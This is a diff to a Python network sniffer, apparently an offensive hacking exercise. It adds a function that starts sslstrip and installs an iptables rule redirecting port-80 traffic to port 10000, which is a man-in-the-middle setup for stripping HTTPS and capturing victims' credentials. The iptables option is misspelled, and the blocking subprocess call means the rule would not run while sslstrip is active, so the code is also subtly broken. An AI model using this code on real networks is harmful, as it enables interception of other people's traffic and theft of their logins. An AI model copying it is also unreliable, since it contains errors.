@@ -1,6 +1,13 @@
 import scapy.all as scapy
 from scapy.layers import http
 import optparse
+import subprocess
+
+
+def ssl_strip():
+    subprocess.call("sslstrip")    #10000 port
+    subprocess.call("iptables -t nat -A PREROUTING -p tcp"
+                    " --destionation-port 80 -j REDIRECT --to-port 10000")
 
 
 def get_arguments():
@@ -47,7 +54,6 @@ def process_sniff_packet(packet):
 
 
 if __name__ == "__main__":
-
     options = get_arguments()
     interface = options.interface
 
